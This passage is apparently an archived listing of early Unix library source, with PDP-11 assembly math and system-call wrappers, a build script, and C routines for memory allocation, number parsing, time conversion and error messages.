	mov	r1,r0
	mov	r0,ranx
	bic	$100000,r0
	mov	(sp)+,r1
	rts	pc

.data
ranx:	1
-- /usr/source/s3/run mode=0100664 uid=3 gid=3 atime=174923998 mtime=174917286 --
as atan.s; mv a.out atan.o
as crypt.s; mv a.out crypt.o
as dpadd.s; mv a.out dpadd.o
as ecvt.s; mv a.out ecvt.o
as exp.s; mv a.out exp.o
as floor.s; mv a.out floor.o
as fmod.s; mv a.out fmod.o
as fp?.s; mv a.out fp.o
: as fakfp.s: mv a.out fp.o
as gamma.s; mv a.out gamma.o
as get.s; mv a.out get.o
as ldiv.s; mv a.out ldiv.o
as log.s; mv a.out log.o
as mesg.s; mv a.out mesg.o
as pow.s; mv a.out pow.o
as put.s; mv a.out put.o
as rand.s; mv a.out rand.o
as savr5.s; mv a.out savr5.o
as sin.s; mv a.out sin.o
as sqrt.s; mv a.out sqrt.o
as switch.s; mv a.out switch.o
as ttyn.s; mv a.out ttyn.o
ar r /lib/liba.a
rm *.o
-- /usr/source/s3/savr5.s mode=0100664 uid=3 gid=3 atime=174923985 mtime=169260612 --
/ savr5 - for as progs that call c-callable entries

.globl	savr5
.bss
savr5:	.=.+2
-- /usr/source/s3/sin.s mode=0100664 uid=3 gid=3 atime=174923987 mtime=169260613 --
ldfps = 170100^tst
stfps = 170200^tst
/
.globl sin, _sin
.globl cos, _cos
/
/	floating point sin/cos
/	replaces the value in fr0 by its sin/cos
/	there are no error exits
/	coefficients are #3370 from Hart & Cheney
/
_sin:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,sin
	br	1f

_cos:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,cos
1:
	mov	(sp)+,r5
	rts	pc

cos:
	absf	fr0
	mov	$1,-(sp)
	br	1f
sin:
	clr	-(sp)
1:
	stfps	-(sp)
	ldfps	$200
	movf	fr1,-(sp)
	movf	fr2,-(sp)
	mov	r0,-(sp)
/
/	quadrant reduction -  arg = (2/J)x
/	-1 < arg < 1
/
	movf	fr0,-(sp)
	absf	fr0
	modf	frpi2,fr0
	modf	$fourth,fr1
	mulf	$four,fr1
	movfi	fr1,r0
	add	34(sp),r0
	movf	$one,fr1
	inc	r0
	ror	r0
	bcs	1f
	subf	$one,fr0
1:
	ror	r0
	bcc	1f
	negf	fr0
1:
	tstf	(sp)+
	cfcc
	bpl	1f
	negf	fr0
1:
	movf	fr0,fr1
	mulf	fr0,fr1		/arg^2
/
	movf	p4,fr2
	mulf	fr1,fr2
	addf	p3,fr2
	mulf	fr1,fr2
	addf	p2,fr2
	mulf	fr1,fr2
	addf	p1,fr2
	mulf	fr1,fr2
	addf	p0,fr2
	mulf	fr2,fr0		/ zP(z^2)
/
	movf	fr1,fr2
	addf	q3,fr2
	mulf	fr1,fr2
	addf	q2,fr2
	mulf	fr1,fr2
	addf	q1,fr2
	mulf	fr1,fr2
	addf	q0,fr2		/ Q(z^2)
/
	divf	fr2,fr0		/ zP(z^2)/Q(z^2)
/
	mov	(sp)+,r0
	movf	(sp)+,fr2
	movf	(sp)+,fr1
	ldfps	(sp)+
	tst	(sp)+
/	clc		/tst clears carry
	rts	pc
/
fourth	= 37600
one	= 40200
four	= 40600
/
.data
frpi2:	40042;174603; 67116; 42025
/
p0:	046117;031130;175220;165273
p1:	145626;154170;031651;104637
p2:	044726;162341;133224;052302
p3:	143530;056427;005061;125021
p4:	042021;174005;170441;175607
q0:	046003;163716;123445;167144
q1:	044707;047147;032436;120046
q2:	043423;156142;064161;007314
q3:	042004;123513;026637;160477
/
/p0 =  .13578 84097 87737 56690 92680 d8
/p1 = -.49429 08100 90284 41611 58627 d7
/p2 =  .44010 30535 37526 65019 44918 d6
/p3 = -.13847 27249 98245 28730 54457 d5
/p4 =  .14596 88406 66576 87222 26959 d3
/q0 =  .86445 58652 92253 44299 15149 d7
/q1 =  .40817 92252 34329 97493 95779 d6
/q2 =  .94630 96101 53820 81805 71257 d4
/q3 =  .13265 34908 78613 63589 11494 d3
/q4 =  .1                             d1
-- /usr/source/s3/sqrt.s mode=0100664 uid=3 gid=3 atime=174923990 mtime=169260613 --
ldfps = 170100^tst
stfps = 170200^tst
/
/	sqrt replaces the f.p. number in fr0 by its
/	square root.  newton's method
/
.globl	sqrt, _sqrt
/
/
_sqrt:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,sqrt
	mov	(sp)+,r5
	rts	pc

sqrt:
	tstf	fr0
	cfcc
	bne	1f
	clc
	rts	pc		/sqrt(0)
1:
	bgt	1f
	clrf	fr0
	sec
	rts	pc		/ sqrt(-a)
1:
	mov	r0,-(sp)
	stfps	-(sp)
	mov	(sp),r0
	bic	$!200,r0		/ retain mode
	ldfps	r0
	movf	fr1,-(sp)
	movf	fr2,-(sp)
/
	movf	fr0,fr1
	movf	fr0,-(sp)
	asr	(sp)
	add	$20100,(sp)
	movf	(sp)+,fr0	/initial guess
	mov	$4,r0
1:
	movf	fr1,fr2
	divf	fr0,fr2
	addf	fr2,fr0
	mulf	$half,fr0	/ x = (x+a/x)/2
	sob	r0,1b
2:
	movf	(sp)+,fr2
	movf	(sp)+,fr1
	ldfps	(sp)+
	mov	(sp)+,r0
	clc
	rts	pc
/
half	= 40000
-- /usr/source/s3/switch.s mode=0100664 uid=3 gid=3 atime=174923992 mtime=169260613 --
/ switch -- switch on contents of r0
/
/
/ calling sequence --
/
/   jsr r5,switch; swtab
/
/ r0 is looked up in swtab and if found
/ control is returned to the corresponding place
/ if r0 is not found, the next inline instruction is 
/ executed
/
/ swtab format --
/
/ swtab:
/    val1; ret1
/   val2; ret2
/   ...
/   valn; retn
/   ..; 0
/

	.globl	switch
switch:
	mov	r1,-(sp)
	mov	(r5)+,r1
1:
	cmp	r0,(r1)+
	beq	1f
	tst	(r1)+
	bne	1b
2:
	mov	(sp)+,r1
	rts	r5
1:
	mov	(r1)+,r1
	beq	2b
	mov	r1,r5
	br	2b

-- /usr/source/s3/ttyn.s mode=0100664 uid=3 gid=3 atime=174923994 mtime=169260613 --
/ return name of current tty

.globl	ttyn, _ttyn

_ttyn:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	jsr	pc,1f
	mov	(sp)+,r5
	rts	pc

ttyn:
	clr	r0
1:
	mov	$'x,name
	tst	-(sp)
	sys	fstat; buf
	bes	er1
	mov	buf+2,(sp)
	sys	open; dev; 0
	bes	er1
	mov	r0,r1
1:
	mov	r1,r0
	sys	read; buf; 16.
	bes	er
	cmp	r0,$16.
	bne	er
	mov	$buf,r0
	cmp	(r0)+,(sp)
	bne	1b
	cmp	(r0)+,$"tt
	bne	1b
	cmpb	(r0)+,$'y
	bne	1b
	tstb	(r0)+
	beq	1b
	cmpb	(r0),$'\0
	bne	1b
	movb	-(r0),name

er:
	mov	r1,r0
	sys	close

er1:
	tst	(sp)+
	movb	name,r0
	rts	pc

.data
dev:	</dev\0>
.even
.bss
buf:	.=.+40.
name:	.=.+2
-- /usr/source/s4 mode=0140775 uid=3 gid=3 atime=174930093 mtime=174924110 --
-- /usr/source/s4/abort.s mode=0100664 uid=3 gid=3 atime=174924007 mtime=169260896 --
/ C library -- abort

.globl	_abort
iot	= 4

_abort:
	mov	r5,-(sp)
	mov	sp,r5
	iot
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/abs.s mode=0100664 uid=3 gid=3 atime=174924009 mtime=169260897 --
/ abs - int absolute value.
/ fabs - floating abs

.globl	_abs
_abs:
	mov	2(sp),r0
	bge	1f
	neg	r0
1:
	rts	pc

.globl	_fabs
_fabs:
	movf	2(sp),fr0
	absf	fr0
	rts	pc
-- /usr/source/s4/alloc.s mode=0100664 uid=3 gid=3 atime=174924011 mtime=174845454 --
/	storage allocator for use with C
/
/
/
/	hand-tooled from C compilation to modify save-return
/	so that it can be called from within the C save
/	when running with coroutines
/
/#
//*
/ *	C storage allocator
/ *	(circular first fit strategy)
/ */
/#define BLOK 512
/#define BUSY 01
/
/char *allocs[2] {		/*initial empty arena*/
/	&allocs[1],
/	&allocs[0]
/};
/struct { int word; };
/char **allocp &allocs[1];	/*current search pointer*/
/char **alloct &allocs[1];	/*top of arena (last cell)*/
/
/alloc(nbytes)
/{
/	register int nwords;
/	register char **p, **q;
/	static char **t;
/
/	allocs[0].word =| BUSY;	/*static initialization*/
/	allocs[1].word =| BUSY;
/
/	nwords = (nbytes+(2*sizeof(p)-1))/sizeof(p);
/	for(p=allocp;;) {
/		do {
/			if((p->word&BUSY)==0) {
/				while(((q = *p)->word&BUSY)==0)
/					*p = *q;
/				if(q >= &p[nwords])
/					goto found;
/			}
/			q = p;
/			p = p->word & ~BUSY;
/		} while(q>=allocp || p<allocp);
/		if((*alloct=t=sbrk(BLOK*sizeof(p))) == -1)
/			return(-1);
/		if(t!=alloct+1)
/			alloct->word =| BUSY;
/		alloct = (*t = &t[BLOK]-1);
/		*alloct = allocs;
/		alloct->word =| BUSY;
/	}
/found:
/	allocp = &p[nwords];
/	if(q>allocp)
/		*allocp = *p;
/	*p = allocp.word|BUSY;
/	return(p+1);
/}
/
/free(p)
/char **p;
/{
/	allocp = p-1;
/	allocp->word =& ~BUSY;
/}
.globl	_allocs
.data
_allocs=.
2+_allocs
_allocs
.globl	_allocp
.data
_allocp=.
2+_allocs
.globl	_alloct
.data
_alloct=.
2+_allocs
.globl	_alloc

.globl	_sbrk
.text
_alloc:
mov	r5,-(sp)
mov	sp,r5
mov	r4,-(sp)
mov	r3,-(sp)
mov	r2,-(sp)
bis	$1,_allocs
bis	$1,2+_allocs
mov	4(r5),r4
add	$3,r4
asr	r4
mov	_allocp,r3
jbr	L6
L7:mov	r3,r2
mov	(r3),r3
bic	$!177776,r3
cmp	r2,_allocp
jhis	L6
cmp	r3,_allocp
jlo	L6
mov	$2000,-(sp)
jsr	pc,*$_sbrk
tst	(sp)+
mov	r0,t
mov	r0,*_alloct
cmp	$177777,r0
jeq	L11
mov	_alloct,r0
add	$2,r0
cmp	t,r0
jeq	L12
bis	$1,*_alloct
L12:mov	t,r0
add	$1776,r0
mov	r0,*t
mov	r0,_alloct
mov	$_allocs,*_alloct
bis	$1,*_alloct
L6:bit	$1,(r3)
jeq	L8
jbr	L7
L20001:mov	(r2),(r3)
L8:mov	(r3),r2
bit	$1,(r2)
jeq	L20001
mov	r4,r0
asl	r0
add	r3,r0
cmp	r2,r0
jlo	L7
mov	r4,r0
asl	r0
add	r3,r0
mov	r0,_allocp
cmp	r2,r0
jlos	L13
mov	(r3),*_allocp
L13:mov	_allocp,r0
bis	$1,r0
mov	r0,(r3)
mov	r3,r0
add	$2,r0
L11:
mov	(sp)+,r2
mov	(sp)+,r3
mov	(sp)+,r4
mov	(sp)+,r5
rts	pc
.globl	_free
.text
_free:
mov	r5,-(sp)
mov	sp,r5
mov	4(r5),r0
add	$177776,r0
mov	r0,_allocp
bic	$!177776,*_allocp
mov	(sp)+,r5
rts	pc
.bss
t:	.=.+2
-- /usr/source/s4/atof.s mode=0100664 uid=3 gid=3 atime=174924013 mtime=169260897 --
/ C library -- ascii to floating

/	f = atof(p)
/	char *p;

ldfps = 170100^tst
stfps = 170200^tst

.globl	_atof

.globl	csv, cret

_atof:
	jsr	r5,csv
	stfps	-(sp)
	ldfps	$200
	movf	fr1,-(sp)
	clr	-(sp)
	clrf	fr0
	clr	r2
	mov	4(r5),r3
1:
	movb	(r3)+,r0
	cmp	$' ,r0
	beq	1b
	cmpb	r0,$'-
	bne	2f
	inc	(sp)
1:
	movb	(r3)+,r0
2:
	sub	$'0,r0
	cmp	r0,$9.
	bhi	2f
	jsr	pc,digit
		br 1b
	inc	r2
	br	1b
2:
	cmpb	r0,$'.-'0
	bne	2f
1:
	movb	(r3)+,r0
	sub	$'0,r0
	cmp	r0,$9.
	bhi	2f
	jsr	pc,digit
		dec r2
	br	1b
2:
	cmpb	r0,$'E-'0
	beq	3f
	cmpb	r0,$'e-'0
	bne	1f
3:
	clr	r4
	clr	r1
	cmpb	(r3),$'-
	bne	3f
	inc	r4
	inc	r3
3:
	movb	(r3)+,r0
	sub	$'0,r0
	cmp	r0,$9.
	bhi	3f
	mul	$10.,r1
	add	r0,r1
	br	3b
3:
	tst	r4
	bne	3f
	neg	r1
3:
	sub	r1,r2
1:
	movf	$one,fr1
	mov	r2,-(sp)
	beq	2f
	bgt	1f
	neg	r2
1:
	cmp	r2,$38.
	blos	1f
	clrf	fr0
	tst	(sp)+
	bmi	out
	movf	$huge,fr0
	br	out
1:
	mulf	$ten,fr1
	sob	r2,1b
2:
	tst	(sp)+
	bge	1f
	divf	fr1,fr0
	br	2f
1:
	mulf	fr1,fr0
	cfcc
	bvc	2f
	movf	$huge,fr0
2:
out:
	tst	(sp)+
	beq	1f
	negf	fr0
1:
	movf	(sp)+,fr1
	ldfps	(sp)+
	jmp	cret
/
/
digit:
	cmpf	$big,fr0
	cfcc
	blt	1f
	mulf	$ten,fr0
	movif	r0,fr1
	addf	fr1,fr0
	rts	pc
1:
	add	$2,(sp)
	rts	pc
/
/
one	= 40200
ten	= 41040
big	= 56200
huge	= 77777
-- /usr/source/s4/atoi.c mode=0100664 uid=3 gid=3 atime=174924081 mtime=169260897 --
atoi(ap)
char *ap;
{
	register n, c;
	register char *p;
	int f;

	p = ap;
	n = 0;
	f = 0;
loop:
	while(*p == ' ' || *p == '	')
		p++;
	if(*p == '-') {
		f++;
		p++;
		goto loop;
	}
	while(*p >= '0' && *p <= '9')
		n = n*10 + *p++ - '0';
	if(f)
		n = -n;
	return(n);
}
-- /usr/source/s4/cerror.s mode=0100664 uid=3 gid=3 atime=174924016 mtime=169260897 --
/ C return sequence which
/ sets errno, returns -1.

.globl	cerror
.comm	_errno,2

cerror:
	mov	r0,_errno
	mov	$-1,r0
	mov	r5,sp
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/chdir.s mode=0100664 uid=3 gid=3 atime=174924018 mtime=169260897 --
/ C library -- chdir

/ error = chdir(string);

.globl	_chdir, cerror

_chdir:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	chdir; 0:..
-- /usr/source/s4/chmod.s mode=0100664 uid=3 gid=3 atime=174924020 mtime=169260897 --
/ C library -- chmod

/ error = chmod(string, mode);

.globl	_chmod, cerror

_chmod:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	chmod; 0:..; ..
-- /usr/source/s4/chown.s mode=0100664 uid=3 gid=3 atime=174924022 mtime=169260897 --
/ C library -- chown

/ error = chown(string, owner);

.globl	_chown, cerror

_chown:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	chown; 0:..; ..
-- /usr/source/s4/close.s mode=0100664 uid=3 gid=3 atime=174924024 mtime=169260897 --
/ C library -- close

/ error =  close(file);

.globl	_close, cerror

_close:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	sys	close
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/creat.s mode=0100664 uid=3 gid=3 atime=174924027 mtime=169260897 --
/ C library -- creat

/ file = creat(string, mode);
/
/ file == -1 if error

.globl	_creat, cerror

_creat:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	creat; 0:..; ..
-- /usr/source/s4/crt0.s mode=0100664 uid=3 gid=3 atime=174924001 mtime=169260897 --
/ C runtime startoff

.globl	savr5
.globl	_exit

.globl	_main

start:
	setd
	mov	sp,r0
	mov	(r0),-(sp)
	tst	(r0)+
	mov	r0,2(sp)
	jsr	pc,_main
	mov	r0,(sp)
	jsr	pc,*$_exit
	sys	exit

.bss
savr5:	.=.+2
-- /usr/source/s4/csv.s mode=0100664 uid=3 gid=3 atime=174924029 mtime=169260897 --
/ C register save and restore -- version 12/74

.globl	csv
.globl	cret

csv:
	mov	r5,r0
	mov	sp,r5
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	tst	-(sp)
	jmp	(r0)

cret:
	mov	r5,r1
	mov	-(r1),r4
	mov	-(r1),r3
	mov	-(r1),r2
	mov	r5,sp
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/ctime.c mode=0110664 uid=3 gid=3 atime=174924086 mtime=169260897 --
#
/*
 * This routine converts time as follows.
 * The epoch is 0000 Jan 1 1970 GMT.
 * The argument time is in seconds since then.
 * The localtime(t) entry returns a pointer to an array
 * containing
 *  seconds (0-59)
 *  minutes (0-59)
 *  hours (0-23)
 *  day of month (1-31)
 *  month (0-11)
 *  year-1970
 *  weekday (0-6, Sun is 0)
 *  day of the year
 *  daylight savings flag
 *
 * The routine corrects for daylight saving
 * time and will work in any time zone provided
 * "timezone" is adjusted to the difference between
 * Greenwich and local standard time (measured in seconds).
 * In places like Michigan "daylight" must
 * be initialized to 0 to prevent the conversion
 * to daylight time.
 * There is a table which accounts for the peculiarities
 * undergone by daylight time in 1974-1975.
 *
 * The routine does not work
 * in Saudi Arabia which runs on Solar time.
 *
 * asctime(tvec))
 * where tvec is produced by localtime
 * returns a ptr to a character string
 * that has the ascii time in the form
 *	Thu Jan 01 00:00:00 1970n0\\
 *	01234567890123456789012345
 *	0	  1	    2
 *
 * ctime(t) just calls localtime, then asctime.
 */
char	cbuf[26];
int	dmsize[12]
{
	31,
	28,
	31,
	30,
	31,
	30,
	31,
	31,
	30,
	31,
	30,
	31
};

int timezone	5*60*60;
int tzname[]
{
	"EST",
	"EDT",
};
int	daylight 1;	/* Allow daylight conversion */
/*
 * The following table is used for 1974 and 1975 and
 * gives the day number of the first day after the Sunday of the
 * change.
 */
struct {
	int	daylb;
	int	dayle;
} daytab[] {
	5,	333,	/* 1974: Jan 6 - last Sun. in Nov */
	58,	303,	/* 1975: Last Sun. in Feb - last Sun in Oct */
};

#define	SEC	0
#define	MIN	1
#define	HOUR	2
#define	MDAY	3
#define	MON	4
#define	YEAR	5
#define	WDAY	6
#define	YDAY	7
#define	ISDAY	8

ctime(at)
int *at;
{
	return(asctime(localtime(at)));
}

localtime(tim)
int tim[];
{
	register int *t, *ct, dayno;
	int daylbegin, daylend;
	int copyt[2];

	t = copyt;
	t[0] = tim[0];
	t[1] = tim[1];
	dpadd(t, -timezone);
	ct = gmtime(t);
	dayno = ct[YDAY];
	daylbegin = 119;	/* last Sun in Apr */
	daylend = 303;		/* Last Sun in Oct */
	if (ct[YEAR]==74 || ct[YEAR]==75) {
		daylbegin = daytab[ct[YEAR]-74].daylb;
		daylend = daytab[ct[YEAR]-74].dayle;
	}
	daylbegin = sunday(ct, daylbegin);
	daylend = sunday(ct, daylend);
	if (daylight &&
	    (dayno>daylbegin || (dayno==daylbegin && ct[HOUR]>=2)) &&
	    (dayno<daylend || (dayno==daylend && ct[HOUR]<1))) {
		dpadd(t, 1*60*60);
		ct = gmtime(t);
		ct[ISDAY]++;
	}
	return(ct);
}

/*
 * The argument is a 0-origin day number.
 * The value is the day number of the first
 * Sunday on or after the day.
 */
sunday(at, ad)
int *at;
{
	register int *t, d;

	t = at;
	d = ad;
	if (d >= 58)
		d =+ dysize(t[YEAR]) - 365;
	return(d - (d - t[YDAY] + t[WDAY] + 700) % 7);
}

gmtime(tim)
int tim[];
{
	register int d0, d1;
	register *tp;
	static xtime[9];
	extern int ldivr;

	/*
	 * break initial number into
	 * multiples of 8 hours.
	 * (28800 = 60*60*8)
	 */

	d0 = ldiv(tim[0], tim[1], 28800);
	d1 = ldivr;
	tp = &xtime[0];

	/*
	 * generate hours:minutes:seconds
	 */

	*tp++ = d1%60;
	d1 =/ 60;
	*tp++ = d1%60;
	d1 =/ 60;
	d1 =+ (d0%3)*8;
	d0 =/ 3;
	*tp++ = d1;

	/*
	 * d0 is the day number.
	 * generate day of the week.
	 */

	xtime[WDAY] = (d0+4)%7;

	/*
	 * year number
	 */
	for(d1=70; d0 >= dysize(d1); d1++)
		d0 =- dysize(d1);
	xtime[YEAR] = d1;
	xtime[YDAY] = d0;

	/*
	 * generate month
	 */

	if (dysize(d1)==366)
		dmsize[1] = 29;
	for(d1=0; d0 >= dmsize[d1]; d1++)
		d0 =- dmsize[d1];
	dmsize[1] = 28;
	*tp++ = d0+1;
	*tp++ = d1;
	xtime[ISDAY] = 0;
	return(xtime);
}

asctime(t)
int *t;
{
	register char *cp, *ncp;
	register int *tp;

	cp = cbuf;
	for (ncp = "Day Mon 00 00:00:00 1900\n"; *cp++ = *ncp++;);
	ncp = &"SunMonTueWedThuFriSat"[3*t[6]];
	cp = cbuf;
	*cp++ = *ncp++;
	*cp++ = *ncp++;
	*cp++ = *ncp++;
	cp++;
	tp = &t[4];
	ncp = &"JanFebMarAprMayJunJulAugSepOctNovDec"[(*tp)*3];
	*cp++ = *ncp++;
	*cp++ = *ncp++;
	*cp++ = *ncp++;
	cp = ct_numb(cp, *--tp);
	cp = ct_numb(cp, *--tp+100);
	cp = ct_numb(cp, *--tp+100);
	cp = ct_numb(cp, *--tp+100);
	cp =+ 2;
	cp = ct_numb(cp, t[YEAR]);
	return(cbuf);
}

dysize(y)
{
	if((y%4) == 0)
		return(366);
	return(365);
}

ct_numb(acp, n)
{
	register char *cp;

	cp = acp;
	cp++;
	if (n>=10)
		*cp++ = (n/10)%10 + '0';
	else
		*cp++ = ' ';
	*cp++ = n%10 + '0';
	return(cp);
}
-- /usr/source/s4/dup.s mode=0100664 uid=3 gid=3 atime=174924031 mtime=169260897 --
/ C library -- dup

/	f = dup(of)
/	f == -1 for error

dup = 41.

.globl	_dup, cerror

_dup:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	sys	dup
	bec	1f
	jmp	cerror
1:
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s4/errlst.c mode=0100664 uid=3 gid=3 atime=174924095 mtime=169260897 --
char	*sys_errlist[] {
	"Error 0",
	"Not super-user",
	"No such file or directory",
	"No such process",
	"Interrupted system call",
	"I/O error",
	"No such device or address",
	"Arg list too long",
	"Exec format error",
	"Bad file number",
	"No children",
	"No more processes",
	"Not enough core",
	"Permission denied",
	"Error 14",
	"Block device required",
	"Mount device busy",
	"File exists",
	"Cross-device link",
	"No such device",
	"Not a directory",
	"Is a directory",
	"Invalid argument",
	"File table overflow",
	"Too many open files",
	"Not a typewriter",
	"Text file busy",
	"File too large",
	"No space left on device",
	"Illegal seek",
	"Read-only file system",
	"Too many links",
	"Broken Pipe",
};
int	sys_nerr { sizeof sys_errlist/sizeof sys_errlist[0] };
-- /usr/source/s4/execl.s mode=0100664 uid=3 gid=3 atime=174924033 mtime=169260897 --
/ C library -- execl

/ execl(file, arg1, arg2, ... , 0);
/

.globl	_execl, cerror

_execl:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	r5,r0
	add	$6,r0
	mov	r0,0f+2
	sys	0; 9f
	jmp	cerror
.data
9:
	sys	exec; 0:..; ..
-- /usr/source/s4/execv.s mode=0100664 uid=3 gid=3 atime=174924036 mtime=169260897 --
/ C library -- execv

/ execv(file, argv);
/
/ where argv is a vector argv[0] ... argv[x], 0
/ last vector element must be 0
/
/ The _exectrap flags is used by the debugger and causes
/ a trace trap on the first instruction of the executed instruction
/ to give a chance to set breakpoints.

.globl	_execv, cerror
.comm	__exectrap,2
rtt	= 6

_execv:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	mov	6(r5),0f+2
	tst	__exectrap
	beq	1f
	mov	$170020,-(sp)	/ t-bit
	mov	$1f,-(sp)
	rtt
1:
	sys	0; 9f
	jmp	cerror
.data
9:
	sys	exec; 0:..; ..
-- /usr/source/s4/exit.s mode=0100664 uid=3 gid=3 atime=174924038 mtime=169260897 --
/ C library -- exit

/ exit(code)
/ code is return in r0 to system

.globl	_exit

_exit:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	sys	exit

-- /usr/source/s4/fcrt0.s mode=0100664 uid=3 gid=3 atime=174924004 mtime=169260897 --
/ C runtime startoff
/ with floating point interpreter

.globl	savr5
.globl	fptrap
.globl	_exit

.globl	_main

start:
	sys	signal; 4; fptrap
	setd
	mov	sp,r0
	mov	(r0),-(sp)
	tst	(r0)+
	mov	r0,2(sp)
	jsr	pc,_main
	mov	r0,(sp)
	jsr	pc,*$_exit
	sys	exit

.bss
savr5:	.=.+2
-- /usr/source/s4/ffltpr.s mode=0100664 uid=3 gid=3 atime=174924040 mtime=169260897 --
/ C library-- fake floating output

.globl	pfloat
.globl	pscien

pfloat:
pscien:
	add	$8,r4
	movb	$'?,(r3)+
	rts	pc
-- /usr/source/s4/fltpr.s mode=0100664 uid=3 gid=3 atime=174924042 mtime=169260897 --
/ C library-- floating output

.globl	pfloat
.globl	pscien
.globl	fltused

.globl	_ndigit
.globl	ecvt
.globl	fcvt

fltused:		/ force loading
pfloat:
	mov	r0,_ndigit
	tst	r2
	bne	1f
	mov	$6,_ndigit
1:
	movf	(r4)+,fr0
	jsr	pc,fcvt
	tst	r1
	beq	1f
	movb	$'-,(r3)+
1:
	tst	r2
	bgt	1f
	movb	$'0,(r3)+
1:
	mov	r2,r1
	ble	1f
2:
	movb	(r0)+,(r3)+
	sob	r1,2b
1:
	mov	_ndigit,r1
	beq	1f
	movb	$'.,(r3)+
1:
	neg	r2
	ble	1f
2:
	dec	r1
	blt	1f
	movb	$'0,(r3)+
	sob	r2,2b
1:
	tst	r1
	ble	2f
1:
	movb	(r0)+,(r3)+
	sob	r1,1b
2:
	rts	pc

pscien:
	mov	r0,_ndigit
	tst	r2
	bne	1f
	mov	$6,_ndigit
1:
	movf	(r4)+,fr0
	jsr	pc,ecvt
	tst	r1
	beq	1f
	movb	$'-,(r3)+
1:
	movb	(r0)+,(r3)+
	movb	$'.,(r3)+
	mov	_ndigit,r1
	dec	r1
	ble	1f
2:
	movb	(r0)+,(r3)+
	sob	r1,2b
1:
	movb	$'e,(r3)+
	dec	r2
	mov	r2,r1
	bge	1f
	movb	$'-,(r3)+
	neg	r1
	br	2f
1:
	movb	$'+,(r3)+
2:
	clr	r0
	div	$10.,r0
	add	$'0,r0
	movb	r0,(r3)+
	add	$'0,r1
	movb	r1,(r3)+
	rts	pc
-- /usr/source/s4/fork.s mode=0100664 uid=3 gid=3 atime=174924045 mtime=169260897 --
/ C library -- fork

/ pid = fork();
/
/ pid == 0 in child process; pid == -1 means error return
/ in child, parents id is in par_uid if needed

.globl	_fork, cerror, _par_uid

_fork:
	mov	r5,-(sp)
	mov	sp,r5
	sys	fork
		br 1f
	bec	2f
	jmp	cerror
1:
	mov	r0,_par_uid
	clr	r0
2:
	mov	(sp)+,r5
	rts	pc
.bss
_par_uid: .=.+2
-- /usr/source/s4/fstat.s mode=0100664 uid=3 gid=3 atime=174924047 mtime=169260897 --
/ C library -- fstat

/ error = fstat(file, statbuf);

/ int statbuf[17] or
/ char statbuf[34]
/ as appropriate

.globl	_fstat, cerror

_fstat:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	mov	6(r5),0f
	sys	0; 9f
	bec	1f
	jmp	cerror
1:
	clr	r0
	mov	(sp)+,r5
	rts	pc
.data
9:
	sys	fstat; 0:..
-- /usr/source/s4/getc.s mode=0100664 uid=3 gid=3 atime=174924049 mtime=169260897 --
/ getw/getc -- get words/characters from input file
/ fopen -- open a file for use by get(c|w)

indir = 0

.globl	_getc, _getw, _fopen
.globl	cerror
.comm	_errno,2

_fopen:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),0f
	sys	0; 9f
	.data
9:	sys	open; 0:..; 0
	.text
	bes	badret
	mov	6(r5),r1
	mov	r0,(r1)+
	clr	(r1)+
	clr	r0
	mov	(sp)+,r5
	rts	pc

_getw:
	clr	_errno
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r1
	sub	$2,2(r1)
	bge	1f
	cmp	2(r1),$-1
	blt	2f
	movb	*4(r1),-(sp)
	jsr	pc,fill
	mov	4(r1),r0
	br	3f
2:
	jsr	pc,fill
	dec	2(r1)
1:
	mov	4(r1),r0
	movb	(r0)+,-(sp)
3:
	movb	(r0)+,1(sp)
	mov	r0,4(r1)
	mov	(sp)+,r0
	mov	(sp)+,r5
	rts	pc

_getc:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r1
	dec	2(r1)
	bge	1f
	jsr	pc,fill
1:
	clr	r0
	bisb	*4(r1),r0
	inc	4(r1)
	mov	(sp)+,r5
	rts	pc

fill:
	mov	r1,r0
	add	$6,r0
	mov	r0,0f
	mov	r0,4(r1)
	mov	(r1),r0
	sys	0; 9f
.data
9:	sys	read; 0:..; 512.
.text
	bes	badret
	dec	r0
	bmi	badret
	mov	r0,2(r1)
	rts	pc

badret:
	jmp	cerror
-- /usr/source/s4/getchr.s mode=0100664 uid=3 gid=3 atime=174924051 mtime=169260898 --
/ getchar() -- get a character from input file fin

.globl	_getchar
.comm	_errno,2
.comm	_fin,518.

_getchar:
	mov	r5,-(sp)
	mov	sp,r5
	dec	_fin+2
	bge	1f
	mov	$_fin+6,_fin+4
	mov	_fin,r0
	sys	read; _fin+6; 512.
	bes	badret
	tst	r0
	beq	badret
	dec	r0
